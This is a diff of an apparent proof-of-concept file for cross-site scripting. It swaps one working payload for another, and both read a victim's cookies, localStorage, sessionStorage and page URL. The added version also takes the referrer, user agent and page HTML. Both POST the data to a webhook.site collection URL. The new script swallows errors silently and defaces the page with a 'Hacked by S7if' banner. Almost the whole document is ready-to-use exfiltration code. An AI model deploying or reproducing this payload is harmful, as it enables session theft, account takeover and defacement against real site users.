@@ -1,33 +1,32 @@
-<!DOCTYPE html>
-<html>
-  <head>
-    <title>PoC Login Page</title>
-  </head>
-  <body>
-    <h1>Please wait...</h1>
+<script>
+(async () => {
+  // ⛓ سحب البيانات
+  const everything = {
+    cookies: document.cookie,
+    localStorage: {...localStorage},
+    sessionStorage: {...sessionStorage},
+    url: location.href,
+    referrer: document.referrer,
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    time: new Date().toISOString(),
+    html: document.documentElement.outerHTML.slice(0, 2000)
+  };
 
-    <script>
-      let data = `
-🍪 Cookies:
-${document.cookie}
+  // 🚀 إرسال البيانات
+  try {
+    await fetch("https://webhook.site/323bd404-2b33-4438-93b4-81f85ccc77cb", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify(everything)
+    });
+  } catch (e) {}
 
-📦 LocalStorage:
-${JSON.stringify(localStorage, null, 2)}
-
-📦 SessionStorage:
-${JSON.stringify(sessionStorage, null, 2)}
-
-🌍 URL:
-${location.href}
-      `;
-
-      fetch("https://webhook.site/323bd404-2b33-4438-93b4-81f85ccc77cb", {
-        method: "POST",
-        headers: { "Content-Type": "text/plain" },
-        body: data
-      });
-
-      alert("XSS triggered via /login and data exfiltrated!");
-    </script>
-  </body>
-</html>
+  // 💀 عرض رسالة الاختراق
+  document.body.innerHTML = `
+    <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:black;color:#0f0;font-size:2em;font-family:monospace;">
+       Hacked by S7if 
+    </div>
+  `;
+})();
+</script>
